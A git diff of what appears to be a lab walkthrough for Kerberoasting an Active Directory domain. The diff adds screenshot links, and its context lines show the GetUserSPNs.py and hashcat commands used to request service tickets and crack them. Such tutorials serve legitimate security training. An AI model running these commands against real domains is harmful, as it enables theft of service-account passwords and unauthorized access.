@@ -48,8 +48,7 @@ GetUserSPNs.py lab.local/jdoe:Welcome123! -dc-ip 10.0.1.10
 ```
 
 This will list all service accounts with SPNs in the domain.
-
-<img width="1450" height="222" alt="image" src="https://github.com/user-attachments/assets/40b27373-4159-40e7-93e0-18bf095ef529" />
+<img width="1242" height="207" alt="image" src="https://github.com/user-attachments/assets/2b6895f3-c75f-43f7-8b75-d1cae0619580" />
 
 
 ### 2. Request Service Tickets
@@ -60,6 +59,8 @@ GetUserSPNs.py lab.local/jdoe:Welcome123! -dc-ip 10.0.1.10 -request -outputfile 
 ```
 
 This saves the tickets to `tickets.txt` in a format ready for cracking.
+<img width="1331" height="206" alt="image" src="https://github.com/user-attachments/assets/07aea4c8-bbf8-461e-b587-30bd6a1ab886" />
+
 
 ### 3. Crack the Tickets
 
@@ -71,12 +72,16 @@ hashcat -m 13100 tickets.txt /usr/share/wordlists/rockyou.txt --force
 - `-m 13100`: Kerberos TGS-REP mode
 - `--force`: Ignore warnings (for VM environments)
 
+  <img width="1897" height="859" alt="image" src="https://github.com/user-attachments/assets/8d2d8000-9bed-4d2e-816b-61752fd3958a" />
+
+
 ### 4. Review Results
 
 Check cracked passwords:
 ```bash
 hashcat -m 13100 tickets.txt --show
 ```
+<img width="1892" height="350" alt="image" src="https://github.com/user-attachments/assets/190a149a-006d-4219-a01c-bbe2d7df3256" />
 
 ### 5. Verify Access
 
